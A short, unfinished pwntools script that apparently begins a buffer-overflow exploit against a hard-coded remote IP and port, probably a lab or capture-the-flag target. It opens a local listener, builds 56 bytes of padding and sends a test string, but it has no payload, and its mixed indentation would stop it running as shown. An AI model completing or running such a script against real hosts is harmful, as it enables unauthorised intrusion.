from pwn import *
import struct

context.terminal = ['tmux', 'new-window']

rhost = "83.136.252.214" 
rport = "43228"

if args['NC']:
 	l = listen(9999)
	r = remote(rhost, rport) 
	svr = l.wait_for_connection()
	print(svr.recv())
else:
   print("Required NC as args")

offset = 56
buffer = b""
buffer += b"A"*offset

r.send('hello')


